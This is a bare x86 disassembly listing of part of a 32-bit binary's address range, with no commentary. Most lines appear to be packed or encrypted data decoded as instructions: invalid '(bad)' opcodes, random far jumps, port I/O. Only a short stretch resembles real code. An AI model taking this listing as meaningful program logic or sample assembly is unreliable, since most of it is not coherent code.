  40420e:	sbb    bh,bl
  404210:	faddp  st(7),st
  404212:	xchg   ebp,eax
  404213:	not    DWORD PTR [ebx+0x6dcd1ff8]
  404219:	pop    ebx
  40421a:	pop    es
  40421b:	jmp    0x437d:0x37e486c3
  404222:	shr    BYTE PTR [ebx+0x461bf08b],1
  404228:	xor    edx,DWORD PTR [edi+0x4bfb6e3d]
  40422e:	inc    esp
  40422f:	sub    al,0x11
  404231:	lods   al,BYTE PTR ds:[esi]
  404232:	jno    0x4042b1
  404234:	(bad)  
  404235:	mov    ah,0x90
  404237:	push   0x30f72d3a
  40423c:	xor    DWORD PTR [edi-0x25],esp
  40423f:	add    ebx,edi
  404241:	mov    ch,0xc
  404243:	das    
  404244:	jb     0x4041e5
  404246:	adc    ah,0xb8
  404249:	aad    0x6b
  40424b:	adc    BYTE PTR ds:0x95b60c51,dl
  404251:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404252:	into   
  404253:	add    eax,0x78bb210a
  404258:	cli    
  404259:	loopne 0x404215
  40425b:	xor    DWORD PTR [eax],esi
  40425d:	inc    ebp
  40425e:	xor    BYTE PTR [esp+ebp*8+0x36],0x29
  404263:	mov    esp,0x13628148
  404268:	cmp    edi,0x40
  40426b:	leave  
  40426c:	dec    esi
  40426d:	cmp    edx,DWORD PTR [ebx-0x2e35af7b]
  404273:	jmp    0x1cc3:0x207e16b1
  40427a:	and    eax,DWORD PTR [esi+0x2f1c0dec]
  404280:	and    edx,DWORD PTR [esi-0x73f7311b]
  404286:	push   es
  404287:	mov    edi,0x4692bacc
  40428c:	and    edx,ecx
  40428e:	int3   
  40428f:	je     0x404307
  404291:	or     eax,0x2462875
  404296:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404297:	xor    bl,BYTE PTR [ecx+0x133eddc7]
  40429d:	mov    ch,0x5b
  40429f:	imul   edi,DWORD PTR [ebx-0x3181d89d],0x7074d0d6
  4042a9:	sub    eax,0x2a40c05b
  4042ae:	out    dx,eax
  4042af:	das    
  4042b0:	mov    ebx,eax
  4042b2:	adc    eax,0xdb940086
  4042b7:	repz mov ds:0xa995249e,al
  4042bd:	xor    al,0x56
  4042bf:	adc    dh,BYTE PTR [edi+0x303170a6]
  4042c5:	sub    ecx,DWORD PTR [ecx-0x500b6dd6]
  4042cb:	sbb    BYTE PTR [esi+edi*2-0x7f],cl
  4042cf:	rcr    BYTE PTR [esp+edx*4+0x68c939d9],cl
  4042d6:	pushf  
  4042d7:	inc    edi
  4042d8:	ins    DWORD PTR es:[edi],dx
  4042d9:	test   ecx,edx
  4042db:	xor    ah,dl
  4042dd:	stos   DWORD PTR es:[edi],eax
  4042de:	loope  0x404310
  4042e0:	jmp    0x40426e
  4042e2:	scas   al,BYTE PTR es:[edi]
  4042e3:	(bad)  
  4042e5:	mov    edi,ebx
  4042e7:	add    BYTE PTR [ecx+ebp*8+0x60],cl
  4042eb:	mov    bh,0x4d
  4042ed:	pop    esi
  4042ee:	jmp    0xae1b:0xf6821bd5
  4042f5:	sub    ebx,DWORD PTR [edi-0x3a]
  4042f8:	je     0x404378
  4042fa:	dec    eax
  4042fb:	pop    esp
  4042fc:	scas   al,BYTE PTR es:[edi]
  4042fd:	mov    edi,0xf2cb40e
  404302:	sbb    DWORD PTR [edx],ebp
  404304:	dec    esi
  404305:	cld    
  404306:	sub    eax,0x28d21c0f
  40430b:	out    dx,al
  40430c:	in     al,dx
  40430d:	add    BYTE PTR [ebx-0x721887a7],0xe2
  404314:	xchg   ebx,eax
  404315:	inc    edx
  404316:	xlat   BYTE PTR ds:[ebx]
  404317:	add    al,0xfc
  404319:	inc    edx
  40431a:	xchg   ebx,eax
  40431b:	push   0xffffffe1
  40431d:	dec    esp
  40431e:	pop    ebx
  40431f:	nop
  404320:	cmc    
  404321:	sbb    eax,0xf828016
  404326:	lahf   
  404327:	pop    ecx
  404328:	pop    eax
  404329:	adc    cl,0xc7
  40432c:	or     DWORD PTR [edi+0x4cfeab17],0xe5ac8fa8
  404336:	xor    DWORD PTR [esi],0xffffff84
  404339:	mov    BYTE PTR [ebp+0x75],al
  40433c:	mov    DWORD PTR [eax],edx
  40433e:	mov    eax,0xed5d346c
  404343:	push   ebp
  404344:	cdq    
  404345:	retf   0xb279
  404348:	pop    eax
  404349:	aaa    
  40434a:	xor    ah,BYTE PTR [ebp+eax*4+0x61947e0b]
  404351:	or     eax,0x9387c1e1
  404356:	fcom   DWORD PTR [esp+esi*8+0x104fbb13]
  40435d:	pop    ecx
  40435e:	sub    BYTE PTR [ebx],0xaa
  404361:	nop
  404362:	lock jne 0x4043a2
  404365:	adc    eax,0x60a1b796
  40436a:	addr16 inc esp
  40436c:	jns    0x404302
  40436e:	call   0x28dc:0xa314a6e4
  404375:	rcr    BYTE PTR [edi+0x4b67d141],1
  40437b:	outs   dx,DWORD PTR ds:[esi]
  40437c:	pop    eax
  40437d:	in     al,dx
  40437e:	imul   eax,esi,0xc73afcac
  404384:	sbb    BYTE PTR [edi+0x56a96647],cl
  40438a:	(bad)  
  40438b:	cmp    al,0xe7
  40438d:	xchg   ebx,eax
  40438e:	and    ebx,DWORD PTR [ecx]
  404390:	repz repz in al,dx
  404393:	mov    eax,0xbd972de5
  404398:	xchg   esi,eax
  404399:	fadd   DWORD PTR [ebx]
  40439b:	sbb    eax,0x1399adc7
  4043a0:	cmp    esp,DWORD PTR ds:[edx-0x3002baa7]
  4043a7:	arpl   WORD PTR [edi+0x7c],bp
  4043aa:	in     al,dx
  4043ab:	jb     0x404423
  4043ad:	sahf   
  4043ae:	rol    BYTE PTR [edx+0x7d],0xac
  4043b2:	lock and al,BYTE PTR [edi-0x58]
  4043b6:	push   ecx
  4043b7:	(bad)  
  4043b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4043b9:	cwde   
  4043ba:	sbb    al,0x27
  4043bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4043bd:	adc    ch,BYTE PTR [edi+0x68]
  4043c0:	cmp    cl,BYTE PTR [ecx]
  4043c2:	test   BYTE PTR [eax],0x15
  4043c5:	loopne 0x404404
  4043c7:	leave  
  4043c8:	aas    
  4043c9:	push   ebp
  4043ca:	mov    esi,0xd5dd3624
  4043cf:	sbb    esp,ebx
  4043d1:	cmp    BYTE PTR [ebx+eax*1+0x66eb95f9],dl
  4043d8:	repnz dec ebx
  4043da:	ins    DWORD PTR es:[edi],dx
  4043db:	test   BYTE PTR [eax],dh
  4043dd:	aaa    
  4043de:	sbb    DWORD PTR [ebx-0x3bac4f58],ebp
  4043e4:	icebp  
  4043e5:	scas   eax,DWORD PTR es:[edi]
  4043e6:	pop    ss
  4043e7:	dec    ecx
  4043e8:	(bad)  
  4043ea:	nop
  4043eb:	mov    DWORD PTR [edx-0x48],ebx
  4043ee:	sbb    ch,BYTE PTR [ebx-0x3e]
  4043f1:	inc    eax
  4043f2:	mov    cl,0x6f
  4043f4:	jecxz  0x4043a0
  4043f6:	mov    ds:0xe449d3c4,al
  4043fb:	mov    al,0x60
  4043fd:	imul   esi,DWORD PTR [ebp+0x15a406bd],0x33428ddb
  404407:	sbb    eax,0xf5aab8b3
  40440c:	loope  0x4043c6
  40440e:	dec    edx
  40440f:	stos   DWORD PTR es:[edi],eax
  404410:	es xchg edx,eax
  404412:	rol    DWORD PTR [ecx],cl
  404414:	cdq    
  404415:	retf   0xde17
  404418:	test   al,0x96
  40441a:	jns    0x404437
  40441c:	pop    eax
  40441d:	(bad)  
  40441e:	sbb    al,al
  404420:	mov    BYTE PTR [ebp-0x3a291757],al
  404426:	mov    DWORD PTR [edx+0x18],ebp
  404429:	or     eax,0x7c3dfa34
  40442e:	mov    dh,0x74
  404430:	push   ecx
  404431:	(bad)  
  404432:	dec    esi
  404433:	xchg   esi,eax
  404434:	(bad)  
  404435:	(bad)  
  404436:	out    0xa7,al
  404438:	ja     0x4043ed
  40443a:	test   eax,0x59908a9d
  40443f:	jp     0x404430
  404441:	cmc    
  404442:	inc    esi
  404443:	push   ss
  404444:	adc    al,0x77
  404446:	fs mov edi,0x53a272bb
  40444c:	loop   0x404474
  40444e:	mov    edx,0xd23cb9a2
  404453:	and    BYTE PTR [ebp-0x5d],ah
  404456:	sbb    bh,BYTE PTR [eax+0x2dc3ce03]
  40445c:	test   BYTE PTR [edx+0x1a9a1bd5],ah
  404462:	push   eax
  404463:	push   esp
  404464:	(bad)  
  404465:	ds retf 0x523b
  404469:	inc    edx
  40446a:	mov    dl,0x28
  40446c:	mov    ebx,0x7fca5492
  404471:	jns    0x4043fb
  404473:	js     0x404465
  404475:	(bad)  
  404476:	jecxz  0x4044e4
  404478:	mov    al,0xe
  40447a:	test   dh,bl
  40447c:	xor    edi,eax
  40447e:	jmp    0x404781
  404483:	add    bl,BYTE PTR [ebp+0x44]
  404486:	dec    ecx
  404487:	popa   
  404488:	jno    0x40449d
  40448a:	jne    0x4044e2
  40448c:	xor    al,0xa0
  40448e:	jle    0x4044ee
  404490:	outs   dx,DWORD PTR ds:[esi]
  404491:	fst    DWORD PTR [ebx]
  404493:	pop    esi
  404494:	sbb    BYTE PTR [esi+0x7e],bh
  404497:	pop    eax
  404498:	jl     0x404518
  40449a:	jle    0x4044d6
  40449c:	and    al,0x42
  40449e:	stc    
  40449f:	jne    0x404472
  4044a1:	xchg   dl,bh
  4044a3:	adc    al,0x7b
  4044a5:	jecxz  0x4044e5
  4044a7:	sbb    DWORD PTR [esi],edi
  4044a9:	and    DWORD PTR [edx-0x6e8a2d07],edx
  4044af:	fmul   DWORD PTR [eax+0x10]
  4044b2:	add    DWORD PTR [esi+esi*8],ecx
  4044b5:	xchg   DWORD PTR [ebp-0xd307cdc],esi
  4044bb:	aaa    
  4044bc:	stos   BYTE PTR es:[edi],al
  4044bd:	out    0x5f,eax
  4044bf:	push   es
  4044c0:	mov    eax,ds:0xce2cac73
  4044c5:	mov    ecx,ebp
  4044c7:	enter  0x8314,0x7b
  4044cb:	lahf   
  4044cc:	mov    ds:0x1c896c1a,eax
  4044d1:	mov    eax,ds:0x2192a3b3
  4044d6:	jp     0x40449b
  4044d8:	xchg   BYTE PTR [edi+edi*1+0x7f],bl
  4044dc:	cmp    al,0x35
  4044de:	sbb    eax,esp
  4044e0:	fisubr DWORD PTR [eax+eiz*4]
  4044e3:	jmp    0x4044d3
  4044e5:	into   
  4044e6:	pop    ds
  4044e7:	adc    ebx,edi
  4044e9:	inc    esi
  4044ea:	or     al,0xc1
  4044ec:	imul   edx,DWORD PTR [ebp+0x52],0xaa08e75b
  4044f3:	push   eax
  4044f4:	stos   BYTE PTR es:[edi],al
  4044f5:	and    DWORD PTR [edi+0x392c36a6],edi
  4044fb:	imul   edi,DWORD PTR [esi],0x76
  4044fe:	pushf  
  4044ff:	(bad)
  404502:	push   0x2ab371d7
  404507:	(bad)  
  404508:	nop
  404509:	xor    BYTE PTR [ebx],dh
  40450b:	bound  edx,QWORD PTR [edi-0x70]
  40450e:	sbb    dl,BYTE PTR [ebx]
  404510:	pop    esi
  404511:	xchg   ebp,eax
  404512:	nop
  404513:	data16 aad 0xcf
  404516:	lahf   
  404517:	xor    dl,ah
  404519:	xor    eax,0xbd8aa19
  40451e:	xchg   ebx,eax
  40451f:	pop    ebx
  404520:	pop    es
  404521:	mov    ecx,0x9bfe90a6
  404526:	ins    BYTE PTR es:[edi],dx
  404527:	mov    esi,0xac40b36
  40452c:	shr    DWORD PTR [ebp+0x247740be],cl
  404532:	mov    bh,0xd5
  404534:	mov    edi,0xb56070d2
  404539:	out    0x37,al
  40453b:	imul   esi
  40453d:	jle    0x40458f
  40453f:	mov    cs,WORD PTR [ecx+0x24cc2d54]
  404545:	sbb    ebp,ecx
  404547:	sbb    bh,BYTE PTR [ebp-0x3a2ee547]
  40454d:	mov    al,ds:0x231b7b65
  404552:	mov    esp,0xe523f60a
  404557:	add    eax,0x61fa7e01
  40455c:	sbb    DWORD PTR [edx],esi
  40455e:	pop    ecx
  40455f:	dec    eax
  404560:	inc    eax
  404561:	cli    
  404562:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404563:	sbb    al,BYTE PTR [bp+di]
  404566:	bound  ebx,QWORD PTR [eax+0x6]
  404569:	pop    ebx
  40456a:	cmp    eax,0xafb87ff4
  40456f:	iret   
  404570:	mov    al,0xac
  404572:	dec    ecx
  404573:	and    al,0x55
  404575:	push   0x3d9f2434
  40457a:	xchg   ebp,eax
  40457b:	cmp    bh,BYTE PTR [ebp-0x33]
  40457e:	or     edi,DWORD PTR ds:0xd9af1d92
  404584:	push   ebp
  404585:	mov    dh,0x94
  404587:	push   es
  404588:	jg     0x4045ba
  40458a:	ror    ch,0xf1
  40458d:	dec    ecx
  40458e:	mov    bl,0x59
  404590:	jmp    DWORD PTR [eax+0x6f]
  404593:	sbb    ch,0xc4
  404596:	call   0x5aacfe7a
  40459b:	xor    cl,BYTE PTR [edx+0x66ff89ce]
  4045a1:	mov    ?,WORD PTR [edx+0x1b86896d]
  4045a7:	shl    BYTE PTR [ebx],0x7
  4045aa:	mov    esi,DWORD PTR [eax-0x139869e7]
  4045b0:	mov    ecx,0x2990f6fb
  4045b5:	xchg   edi,eax
  4045b6:	dec    esi
  4045b7:	arpl   si,ax
  4045b9:	pushf  
  4045ba:	inc    ebp
  4045bb:	or     eax,0x2a3b52da
  4045c0:	inc    edx
  4045c1:	or     al,0x56
  4045c3:	pop    ebx
  4045c4:	push   ecx
  4045c5:	or     BYTE PTR [edi-0x21def167],dl
  4045cb:	jno    0x404570
  4045cd:	bound  esi,QWORD PTR [ebx+0x44]
  4045d0:	fmul   DWORD PTR [edx]
  4045d2:	jne    0x4045ee
  4045d4:	dec    ebx
  4045d5:	std    
  4045d6:	stos   DWORD PTR es:[edi],eax
  4045d7:	daa    
  4045d8:	xchg   esp,eax
  4045d9:	xor    al,BYTE PTR [eax-0x19ac68e5]
  4045df:	sbb    ebp,DWORD PTR [ebx-0x7]
  4045e2:	retf   
  4045e3:	add    dl,bl
  4045e5:	dec    edx
  4045e6:	imul   DWORD PTR [eax]
  4045e8:	stc    
  4045e9:	scas   eax,DWORD PTR es:[edi]
  4045ea:	cwde   
  4045eb:	add    edx,DWORD PTR [esi+0x8]
  4045ee:	push   esp
  4045ef:	and    BYTE PTR [ebp-0x37],al
  4045f2:	cld    
  4045f3:	dec    eax
  4045f4:	xlat   BYTE PTR ds:[ebx]
  4045f5:	mov    ebx,DWORD PTR [ebx]
  4045f7:	out    dx,eax
  4045f8:	pop    ecx
  4045f9:	mov    edi,0x895f1e53
  4045fe:	sub    BYTE PTR [edi],0x43
  404601:	scas   al,BYTE PTR es:[edi]
  404602:	xchg   edx,eax
  404603:	inc    ebx
  404604:	add    esp,DWORD PTR [ecx+0x606a15b6]
  40460a:	xchg   esp,eax
  40460b:	jp     0x40463f
  40460d:	adc    BYTE PTR [ebp+0x4a],ch
  404610:	sti    
  404611:	enter  0x9da6,0x34
  404615:	sbb    DWORD PTR [ebx+0x42],ebp
  404618:	retf   
  404619:	je     0x404688
  40461b:	das    
  40461c:	xchg   ecx,eax
  40461d:	(bad)  
  40461e:	lock add DWORD PTR [ebx],edx
  404621:	in     eax,0xb5
  404623:	or     eax,0x48a47825
  404628:	xlat   BYTE PTR ds:[ebx]
  404629:	push   esp
  40462a:	adc    cl,BYTE PTR [edi-0x6dce1c8c]
  404630:	dec    ebx
  404631:	add    DWORD PTR [esi+0x699e5b76],0x864d3a72
  40463b:	xchg   ecx,eax
  40463c:	out    0x2,al
  40463e:	xchg   ebx,eax
  40463f:	mov    eax,ds:0x7af5ec75
  404644:	jg     0x404685
  404646:	mov    edx,0x2d134381
  40464b:	jae    0x40463f
  40464d:	jns    0x40460c
  40464f:	cld    
  404650:	jle    0x404626
  404652:	fnsave [ecx+esi*2-0x73]
  404656:	out    0x43,eax
  404658:	gs pop esi
  40465a:	fsubrp st(6),st
  40465c:	shl    DWORD PTR gs:[eax+eiz*2-0xe],1
  404661:	fdivp  st(2),st
  404663:	test   al,0xd7
  404665:	ss ins BYTE PTR es:[edi],dx
  404667:	ret    
  404668:	out    dx,al
  404669:	mov    edi,0x96db9186
  40466e:	xor    edi,DWORD PTR [edi+0x15]
  404671:	outs   dx,DWORD PTR ds:[esi]
  404672:	repz or edi,DWORD PTR [edi-0x5d]
  404676:	dec    esp
  404677:	mov    ds:0x4c7a5f33,eax
  40467c:	dec    ebx
  40467d:	test   DWORD PTR [ebx+0x20],edx
  404680:	adc    BYTE PTR [edx+0x28],dh
  404683:	stc    
  404684:	xchg   esp,eax
  404685:	aas    
  404686:	cld    
  404687:	push   edx
  404688:	nop
  404689:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40468a:	ins    DWORD PTR es:[edi],dx
  40468b:	mov    ecx,0x5f243cf8
  404690:	data16 das 
  404692:	push   cs
  404693:	lahf   
  404694:	repnz mov dl,0x5d
  404697:	sar    BYTE PTR [ecx+eax*2],0x53
  40469b:	adc    ebp,DWORD PTR [esi-0x1c65e5d7]
  4046a1:	cmp    eax,0x4f84ac71
  4046a6:	sub    al,0x81
  4046a8:	pop    ebx
  4046a9:	inc    ebx
  4046aa:	jb     0x404633
  4046ac:	retf   0xc4e9
  4046af:	inc    edx
  4046b0:	add    al,0x8
  4046b2:	sub    esi,DWORD PTR [edi+0x12]
  4046b5:	cmc    
  4046b6:	inc    ecx
  4046b7:	mov    ebx,0x59bd7859
  4046bc:	call   0xb01:0xd349b776
  4046c3:	repz adc DWORD PTR [esi],ecx
  4046c6:	fsub   DWORD PTR [edi]
  4046c8:	cld    
  4046c9:	lock xchg ebx,eax
  4046cb:	pop    edi
  4046cc:	add    dl,BYTE PTR [edx+ecx*8-0x5e]
  4046d0:	or     bl,0x49
  4046d3:	or     eax,0xe4d7057d
  4046d8:	pop    edx
  4046d9:	push   ebx
  4046da:	mov    dh,0xf2
  4046dc:	inc    eax
  4046dd:	cwde   
  4046de:	xor    al,0xf9
  4046e0:	pop    ds
  4046e1:	push   0xffffffef
  4046e3:	into   
  4046e4:	push   es
  4046e5:	mov    ch,0xc7
  4046e7:	xchg   edx,eax
  4046e8:	(bad)  
  4046e9:	enter  0x6747,0xd9
  4046ed:	les    ecx,FWORD PTR [edi]
  4046ef:	xchg   edx,eax
  4046f0:	mov    gs,edi
  4046f2:	pushf  
  4046f3:	mov    ?,WORD PTR [edx+0x14]
  4046f6:	xor    ah,ah
  4046f8:	cmp    esi,edi
  4046fa:	into   
  4046fb:	pop    edi
  4046fc:	mov    bh,0xd1
  4046fe:	mov    esp,0xf1b0709e
  404703:	mov    dh,0xbf
  404705:	daa    
  404706:	sbb    DWORD PTR [eax],0x7310e1e9
  40470c:	test   al,0xcb
  40470e:	aad    0xac
  404710:	in     eax,0x8
  404712:	adc    cl,BYTE PTR [eax]
  404714:	xchg   edx,eax
  404715:	push   ss
  404716:	fisubr WORD PTR [ebx+ebx*2+0x6cc92de4]
  40471d:	jo     0x40472e
  40471f:	std    
  404720:	adc    ecx,DWORD PTR [ecx+0x47]
  404723:	out    dx,eax
  404724:	clc    
  404725:	call   0xfea3cd4a
  40472a:	stc    
  40472b:	sbb    ebp,ecx
  40472d:	call   0xa66408ab
  404732:	gs inc esp
  404734:	pop    es
  404735:	inc    esi
  404736:	xor    BYTE PTR [ecx+0x1b],dh
  404739:	ins    DWORD PTR es:[edi],dx
  40473a:	push   ecx
  40473b:	aas    
  40473c:	jmp    0x2c9a:0xb4603355
  404743:	and    al,0x48
  404745:	add    al,0x83
  404747:	jge    0x40479e
  404749:	adc    BYTE PTR [ecx+0x1870d531],bl
  40474f:	rcr    BYTE PTR [esi-0x5f3c1b67],1
  404755:	lds    ebp,FWORD PTR [edi-0x4af5870]
  40475b:	inc    ebp
  40475c:	fsubr  DWORD PTR [edx-0x6f1ef819]
  404762:	test   eax,0x8310b689
  404767:	(bad)  
  404768:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404769:	(bad)  
  40476a:	loop   0x404787
  40476c:	out    0xca,al
  40476e:	xchg   ebx,eax
  40476f:	lds    ecx,FWORD PTR [esi+eiz*1-0x6ee91aa2]
  404776:	mov    ebx,0xa9c4fcfb
  40477b:	arpl   WORD PTR ds:0x7623d6f0,dx
  404781:	xor    edx,eax
  404783:	add    edi,ecx
  404785:	add    edx,ecx
  404787:	imul   edx,edi
  40478a:	mov    DWORD PTR [ebp+0xc],edx
  40478d:	mov    edx,DWORD PTR [ebp+0xc]
  404790:	mov    DWORD PTR [ebp-0x24],edx
  404793:	mov    edx,DWORD PTR [ebp-0x8]
  404796:	add    edx,DWORD PTR [ebp-0x40]
  404799:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  4047a0:	mov    DWORD PTR [ebp-0x1c],edx
  4047a3:	jmp    0x404aa6
  4047a8:	sub    ch,BYTE PTR [eax+edi*1+0x6b69b8ad]
  4047af:	test   eax,0xf2c2fa45
  4047b4:	xchg   ecx,eax
  4047b5:	dec    eax
  4047b6:	mov    WORD PTR [ecx],?
  4047b8:	mov    eax,0x587e7e27
  4047bd:	jl     0x40483d
  4047bf:	jle    0x4047cc
  4047c1:	retf   0x8ee0
  4047c4:	(bad)  
  4047c5:	aad    0xce
  4047c7:	pusha  
  4047c8:	stc    
  4047c9:	or     ax,0x738c
  4047cd:	inc    BYTE PTR [ebx]
  4047cf:	jbe    0x404807
  4047d1:	inc    esp
  4047d2:	xor    bh,BYTE PTR [eax+0x1f13b5f1]
  4047d8:	outs   dx,BYTE PTR ds:[esi]
  4047d9:	xchg   edx,eax
  4047da:	pop    eax
  4047db:	inc    ebp
  4047dc:	pop    ss
  4047dd:	jae    0x4047ab
  4047df:	mov    al,0x90
  4047e1:	jo     0x404776
  4047e3:	mov    edi,0xc6863e73
  4047e8:	test   BYTE PTR [eax+0x379e0719],0x59
  4047ef:	fwait
  4047f0:	inc    ebx
  4047f1:	into   
  4047f2:	push   ebp
  4047f3:	cwde   
  4047f4:	mov    ebx,0xf4d218be
  4047f9:	outs   dx,DWORD PTR ds:[esi]
  4047fa:	push   ebp
  4047fb:	push   ebp
  4047fc:	inc    ecx
  4047fd:	xor    al,0xb5
  4047ff:	xor    BYTE PTR [ebp-0x1e],bl
  404802:	jecxz  0x40484a
  404804:	aad    0x3c
  404806:	jmp    FWORD PTR [ebp+edx*1-0xc]
  40480a:	loop   0x404815
  40480c:	pop    edx
  40480d:	mov    edx,ecx
  40480f:	dec    esi
  404810:	inc    ebp
  404811:	ins    BYTE PTR es:[edi],dx
  404812:	ds call 0xf852:0x8b5efac1
  40481a:	add    BYTE PTR [esi+ebx*1],ch
  40481d:	test   al,0xb
  40481f:	xchg   ebp,eax
  404820:	leave  
  404821:	fwait
  404822:	pop    esi
  404823:	jnp    0x404892
  404825:	(bad)  
  404827:	mov    dh,0x4c
  404829:	sbb    DWORD PTR [ebp-0x45],eax
  40482c:	test   BYTE PTR ds:0xbd52928a,cl
  404832:	jnp    0x4047e1
  404834:	jecxz  0x404850
  404836:	ret    
  404837:	sahf   
  404838:	ja     0x4047d3
  40483a:	xchg   esp,eax
  40483b:	daa    
  40483c:	add    eax,0xf244ec51
  404841:	rcl    bl,1
  404843:	sahf   
  404844:	ds fwait
  404846:	dec    edi
  404847:	push   edi
  404848:	jns    0x4047d3
  40484a:	mov    dh,0xc8
  40484c:	gs int 0xd9
  40484f:	cmp    bh,ch
  404851:	ret    0x6d8b
  404854:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404855:	sub    al,0x48
  404857:	sub    bh,dl
  404859:	cs or  eax,0xe2ee2fed
  40485f:	fstp   DWORD PTR [eax+ebx*4]
  404862:	in     al,dx
  404863:	jge    0x404801
  404865:	jo     0x404821
  404867:	(bad)  
  404868:	rol    ch,0xa2
  40486b:	fisubr WORD PTR [ecx-0x673e2b7]
  404871:	jo     0x40483a
  404873:	idiv   DWORD PTR [esi+0x6b313ad6]
  404879:	mov    edi,0xc29fa23b
  40487e:	imul   edx,DWORD PTR [ecx+0x7c],0xffffffb3
  404882:	mov    cl,0xaf
  404884:	adc    cl,BYTE PTR [eax+0xe]
  404887:	pop    ebp
  404888:	and    eax,esi
  40488a:	mov    bh,0xd2
  40488c:	arpl   WORD PTR [eax+0x61f966fe],dx
  404892:	repz fcomp QWORD PTR [ecx+eax*2+0x606d8c8f]
  40489a:	sbb    DWORD PTR [edx+0x488dff61],edi
  4048a0:	and    BYTE PTR [eax-0x5e29314a],ch
  4048a6:	push   edx
  4048a7:	mov    cl,0x47
  4048a9:	push   edx
  4048aa:	mov    al,ch
  4048ac:	pop    eax
  4048ad:	dec    ecx
  4048ae:	cmp    BYTE PTR [eax+0x18],ch
  4048b1:	xchg   edx,eax
  4048b2:	xor    BYTE PTR [esi],bl
  4048b4:	dec    esp
  4048b5:	add    BYTE PTR [esi],0xa2
  4048b8:	push   ebp
  4048b9:	out    dx,eax
  4048ba:	pushf  
  4048bb:	sbb    BYTE PTR [edx-0x3e],0x6e
  4048bf:	repnz pop ecx
  4048c1:	ins    BYTE PTR es:[edi],dx
  4048c2:	cmp    ebx,ebp
  4048c4:	cmp    ecx,esp
  4048c6:	mov    ebp,0x48cc0bcf
  4048cb:	scas   eax,DWORD PTR es:[edi]
  4048cc:	jmp    0x4048c8
  4048ce:	push   edi
  4048cf:	mov    dh,0xb5
  4048d1:	or     DWORD PTR [eax-0x4a921bb7],esp
  4048d7:	pop    es
  4048d8:	xor    edx,DWORD PTR [ecx]
  4048da:	mov    bh,0xd6
  4048dc:	jno    0x404905
  4048de:	aam    0x5a
  4048e0:	mov    al,ds:0x43c3844b
  4048e5:	out    dx,eax
  4048e6:	adc    DWORD PTR [ecx+0x42],ecx
  4048e9:	jmp    0xeb68:0x5b8efd9b
  4048f0:	nop
  4048f1:	bound  ebp,QWORD PTR [edi-0x5f0d01d1]
  4048f7:	add    al,0xee
  4048f9:	xchg   esi,eax
  4048fa:	fdiv   QWORD PTR [ebx]
  4048fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4048fd:	sub    BYTE PTR [eax-0x32b5ac27],ah
  404903:	imul   esp,ebp,0xffffffaa
  404906:	loop   0x404940
  404908:	mov    dl,0x60
  40490a:	add    eax,0x42bc8535
  40490f:	push   ss
  404910:	sub    dh,BYTE PTR ds:0x6d1f2273
  404916:	sub    BYTE PTR [ebp-0x14],cl
  404919:	ins    DWORD PTR es:[edi],dx
  40491a:	icebp  
  40491b:	jno    0x404981
  40491d:	or     eax,ebp
  40491f:	mov    esp,edx
  404921:	mov    ds:0x4a8e7392,eax
  404926:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404927:	repnz pop ecx
  404929:	dec    ebx
  40492a:	ret    
  40492b:	aas    
  40492c:	lock xchg esp,eax
  40492e:	bound  edx,QWORD PTR [ecx+0x10]
  404931:	dec    ebx
  404932:	ret    
  404933:	mov    WORD PTR [ecx+0x1e],es
  404936:	(bad)  
  404938:	adc    DWORD PTR [ebp+0x7d],edx
  40493b:	cmp    bl,BYTE PTR [esi+0x53]
  40493e:	or     al,0x4
  404940:	rcl    DWORD PTR [esi+ebx*2],cl
  404943:	lahf   
  404944:	shr    DWORD PTR [edi-0x669e158],0xf7
  40494b:	xlat   BYTE PTR ds:[ebx]
  40494c:	(bad)  
  40494e:	das    
  40494f:	xchg   edi,eax
  404950:	jecxz  0x40496f
  404952:	or     al,0xd1
  404955:	in     eax,dx
  404956:	push   0xa65468f7
  40495b:	sbb    BYTE PTR [ecx+0x45ad52b],dl
  404961:	and    BYTE PTR [ebp+eax*2-0x668b046b],dh
  404968:	mov    ebp,DWORD PTR [ecx*8+0x690555cf]
  40496f:	loop   0x40490a
  404971:	push   ebx
  404972:	mov    BYTE PTR [ebx-0x6c932104],dh
  404978:	ret    
  404979:	sub    BYTE PTR [esp+edi*4-0x253b0cf2],cl
  404980:	sar    ebx,1
  404982:	mov    ebp,0x78fb3dc
  404987:	lods   al,BYTE PTR ds:[esi]
  404988:	sub    BYTE PTR [eax+0x68],0xa8
  40498c:	add    ah,bl
  40498e:	retf   
  40498f:	sbb    DWORD PTR [esi-0x523dc87],0x37b1bbef
  404999:	cwde   
  40499a:	jmp    0x3bc1:0xbec6627e
  4049a1:	cmp    BYTE PTR [esi],cl
  4049a3:	iret   
  4049a4:	mov    WORD PTR [ebp+0x43],ss
  4049a7:	jp     0x40494c
  4049a9:	pop    esp
  4049aa:	xor    ch,bl
  4049ac:	std    
  4049ad:	and    dh,cl
  4049af:	jp     0x4049cc
  4049b1:	xchg   ebp,eax
  4049b2:	sbb    DWORD PTR [edi+0x28],ecx
  4049b5:	sub    edi,DWORD PTR [edi-0x8e755f9]
  4049bb:	jno    0x4049b0
  4049bd:	les    eax,FWORD PTR [ebx*4+0x56d7122d]
  4049c4:	gs dec ebx
  4049c6:	and    esp,DWORD PTR [ecx]
  4049c8:	cli    
  4049c9:	(bad)  
  4049cc:	jne    0x404a17
  4049ce:	mov    esi,0xd09376e8
  4049d3:	sub    ch,BYTE PTR [esp+eax*2-0x7a]
  4049d7:	dec    ebp
  4049d8:	inc    edi
  4049d9:	sub    bh,BYTE PTR [eax-0x29]
  4049dc:	inc    edi
  4049dd:	sbb    eax,0x442dadaa
  4049e2:	inc    edx
  4049e3:	and    eax,0x74a5ce2a
  4049e8:	cmp    esi,DWORD PTR [edi-0x62e92b02]
  4049ee:	pop    ecx
  4049ef:	adc    al,0x6a
  4049f1:	push   edx
  4049f2:	jbe    0x404a20
  4049f4:	test   eax,eax
  4049f6:	aas    
  4049f7:	jo     0x404a39
  4049f9:	sbb    DWORD PTR [eax],0xf2614904
  4049ff:	sub    al,bh
  404a01:	pop    eax
  404a02:	push   ebx
